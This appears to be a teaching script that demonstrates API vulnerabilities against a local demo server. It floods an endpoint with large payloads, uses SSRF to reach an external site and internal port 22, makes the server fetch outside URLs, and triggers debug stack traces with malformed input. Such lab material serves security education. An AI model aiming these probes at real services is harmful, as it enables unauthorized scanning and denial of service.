import requests
import json

# Base URL for the API
BASE_URL = "http://127.0.0.1:5000"

def demonstrate_unrestricted_resource_consumption():
    print("\n[1] Demonstrating Unrestricted Resource Consumption:")
    try:
        # Sending multiple large payloads
        for i in range(5):  # Increase the range for a more dramatic impact
            payload = {"data": f"large_data_{i}" * 1000}  # Large payload
            response = requests.post(f"{BASE_URL}/store", json=payload)
            print(f"Request {i+1}: {response.json()}")
    except Exception as e:
        print(f"Error: {e}")

def demonstrate_ssrf():
    print("\n[2] Demonstrating Server-Side Request Forgery (SSRF):")
    try:
        # Target an external URL (can be controlled by the attacker)
        target_url = "http://example.com/"
        payload = {"target_url": target_url}
        response = requests.post(f"{BASE_URL}/ssrf", json=payload)
        print(f"SSRF Response from {target_url}: {response.text}")

        # Target an internal IP (e.g., localhost or internal services)
        internal_url = "http://127.0.0.1:22"  # Example of targeting SSH port
        payload = {"target_url": internal_url}
        response = requests.post(f"{BASE_URL}/ssrf", json=payload)
        print(f"SSRF Response from {internal_url}: {response.text}")
    except Exception as e:
        print(f"Error: {e}")

def demonstrate_unsafe_consumption_of_apis():
    print("\n[3] Demonstrating Unsafe Consumption of APIs:")
    try:
        # URL returning data that could be malicious or unexpected
        external_url = "http://example.com/"
        payload = {"url": external_url}
        response = requests.post(f"{BASE_URL}/fetch", json=payload)
        print(f"Fetched Data from {external_url}: {response.text}")
    except Exception as e:
        print(f"Error: {e}")

def demonstrate_security_misconfiguration():
    print("\n[4] Demonstrating Security Misconfiguration:")
    try:
        # Sending invalid payload to trigger debug stack trace
        payload = "INVALID_PAYLOAD"  # Not JSON
        response = requests.post(f"{BASE_URL}/store", data=payload)
        print("Debug Mode Response:", response.text)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("Demonstrating API Vulnerabilities...\n")
    demonstrate_unrestricted_resource_consumption()
    demonstrate_ssrf()
    demonstrate_unsafe_consumption_of_apis()
    demonstrate_security_misconfiguration()
